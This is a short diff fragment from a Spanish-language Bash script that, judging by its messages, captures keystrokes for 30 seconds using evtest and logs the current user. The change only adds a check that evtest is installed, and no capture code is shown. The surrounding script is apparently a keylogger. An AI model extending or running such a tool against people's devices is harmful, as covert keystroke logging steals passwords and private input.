@@ -10,6 +10,12 @@ if [[ $EUID -ne 0 ]]; then
    exit 1
 fi
 
+# Verifica que evtest esta instalado
+if ! command -v evtest &> /dev/null; then
+    echo "[!] Error: evtest no está instalado."
+    exit 1
+fi
+
 echo "[*] Iniciando captura de teclas por 30 segundos..." > "$LOG_FILE"
 
 # Registrar el usuario actual del que se estan registrando las teclas
